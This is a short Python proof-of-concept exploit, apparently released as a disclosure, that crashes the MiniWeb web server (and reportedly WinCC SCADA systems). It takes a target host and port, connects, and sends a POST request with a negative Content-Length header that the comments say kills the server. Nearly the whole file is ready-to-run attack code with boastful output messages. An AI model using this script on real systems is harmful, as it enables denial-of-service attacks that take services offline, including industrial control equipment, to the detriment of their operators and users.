#!/usr/bin/env python
# miniweb Content-Length DoS PoC
# Not a 0day, sadly.
# aluigi found this ages back, I independantly rediscovered it fuzzing
# and noticed it was still unpatched. Oh well, better disclose so!
# vuln version at code.google.com/p/miniweb/
# affects WinCC also :) (Oh, them SCADA...)
# Massive props to ohdae for helping with this!
# insecurety.net | bindshell.it.cx
import sys
import socket

def banner():
    print """
MiniWeb Killer - Kills MiniWeb
-Insecurety Research
-Bindshell Labs
"""

if len(sys.argv) != 3:
    banner()
    print "Usage: ./MiniDoS.py <host> <port>"
    sys.exit(1)

banner()
target = sys.argv[1]
port = sys.argv[2]

evil = "POST / HTTP/1.1\r\n"
evil += "Host: %s\r\n" %(target)
evil += "User-Agent: MiniWeb Killer ^-^\r\n"
evil += "Content-Length: -10 \r\n\r\n" # part that kills the box
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
try:
    expl.connect((target, int(port)))
    print "[+] Connected, firing das payload!"
except:
    print "[-] Connection Failed... Is there even a target?"
    sys.exit(1)
try:
    expl.send(evil)
    print "[+] Payload Sent!"
except:
    print "[-] Payload Sending Failure... WTF?"
    sys.exit(1)
expl.close()
print "[*] Should be dead..."